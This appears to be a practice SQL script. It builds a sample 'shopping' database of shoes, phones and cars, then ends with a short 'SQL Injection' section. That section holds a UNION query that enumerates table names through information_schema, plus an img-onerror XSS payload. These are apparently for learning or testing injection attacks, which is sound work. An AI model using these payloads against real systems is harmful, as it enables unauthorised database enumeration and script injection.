--Creating databse
CREATE DATABASE shopping
USE shopping

--Creating items table
CREATE TABLE items (
    Id INT NOT NULL AUTO_INCREMENT,
    name VARCHAR(100),
    category VARCHAR(100),
    price INT,
    quantity INT,
    CONSTRAINT PK_Status PRIMARY KEY (Id)
);

--Inserting data into DB

    INSERT INTO `items` VALUE (1, "Air Jordan", "Shoes", 10000, 20)
    INSERT INTO `items` VALUE (2, "Adidas Elate", "Shoes", 6000, 35)
    INSERT INTO `items` VALUE (3, "Puma Rapid", "Shoes", 7500, 30)

    
    INSERT INTO `items` VALUE (4, "Samsung", "Phones", 20000, 2000)
    INSERT INTO `items` VALUE (5, "Apple", "Phones", 60000, 1500)
    INSERT INTO `items` VALUE (6, "Oneplus", "Phones", 35000, 1200)

    
    INSERT INTO `items` VALUE (7, "Hyundai", "Cars", 1000000, 100)
    INSERT INTO `items` VALUE (8, "KIA", "Cars", 600000, 70)
    INSERT INTO `items` VALUE (9, "TATA", "Cars", 750000, 90)


--SQL Injection

SELECT name, price, quantity from Items where category = "shoes" union (select table_name, table_schema, 3 from Information_schema.tables)-- "

<img src=X onerror=alert(1)>
